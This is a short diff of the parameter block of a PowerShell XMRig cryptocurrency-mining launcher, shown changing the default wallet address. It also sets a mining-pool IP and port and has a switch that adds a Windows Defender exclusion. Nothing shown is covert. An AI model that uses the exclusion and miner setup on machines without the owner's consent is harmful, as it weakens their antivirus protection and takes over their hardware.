@@ -2,7 +2,7 @@
 param(
     [string]$PoolHost = "91.98.122.165",
     [int]$PoolPort = 3333,
-    [string]$Wallet = "ajmrDtnSJCqchjF3wuiceJRCpAumA3wGLhQjtzf7B9uELFYrbtURHTFabiC8RmVbSkPGznaPhsehxYJvwcSGcwXV495Ytpr7wf",
+    [string]$Wallet = "Z321y5Ugios4VrzgpbGkvoBrmA3QeVC2xao6kY3SDSkA7J8toEUktYzBAYyqQ8SJvP4kAaz1APCBEGRuYWersbCR33tetBoXxg",
     [string]$RigId = "windows-ryzen-1",
     [switch]$AddDefenderExclusion,
     [switch]$VerboseXMRig
